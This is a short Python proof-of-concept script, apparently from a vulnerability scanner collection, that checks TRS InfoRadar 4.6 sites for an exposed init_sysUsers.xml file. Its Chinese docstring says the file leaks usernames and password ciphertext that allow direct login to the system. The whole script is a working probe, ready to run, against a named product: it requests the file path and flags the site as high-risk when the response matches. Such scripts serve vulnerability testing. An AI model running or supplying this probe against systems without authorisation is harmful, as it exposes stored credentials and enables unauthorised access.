#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS网络信息雷达4.6系统敏感信息泄漏到进后台
referer: http://www.wooyun.org/bugs/wooyun-2010-091999
author: Lucifer
description: 敏感文件init_sysUsers.xml中泄露了用户名和密码密文,可直接登录系统。
'''
import sys
import requests
import warnings
from termcolor import cprint

class trs_inforadar_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/inforadar/jsp/xml/init_sysUsers.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"java.beans.XMLDecoder" in req.text and r"property" in req.text:
                cprint("[+]存在TRS网络信息雷达4.6系统敏感信息泄漏漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_inforadar_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()